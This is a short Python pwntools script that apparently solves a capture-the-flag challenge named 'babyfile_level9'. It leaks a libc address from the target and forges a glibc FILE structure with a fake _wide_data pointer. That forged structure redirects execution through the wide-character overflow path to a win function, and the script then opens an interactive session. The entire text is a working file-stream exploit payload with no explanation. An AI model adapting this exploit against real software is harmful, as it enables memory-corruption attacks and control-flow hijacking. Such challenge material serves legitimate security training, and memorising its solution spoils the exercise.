#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level9')
s = '''
b * fwrite
b * fwrite+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
'''
# Extract addresses
p.recvuntil(b'puts() within libc is: ')
puts_addr = int(p.recvline().strip(), 16)
fp_addr = puts_addr +0x169280
log.info(f"puts: {hex(puts_addr)}")
log.info(f"fp: {hex(fp_addr)}")




win = 0x004012e6


payload = b'\x00' * 0x80
payload += p64(win)
payload += p64(fp_addr + 0x1140)  # Some other field
payload += b'\x00' * 0x10  # _codecvt
payload += p64(fp_addr + 0x18)  # _wide_data
payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
payload += p64(puts_addr + 0x1649d8 - 0x38)
payload += b'\x41' * 0x18
payload += p64(fp_addr + 0x18)



gdb.attach(p, s)
time.sleep(2)
#pause()
#payload = 'A'
p.send(payload)

p.interactive()

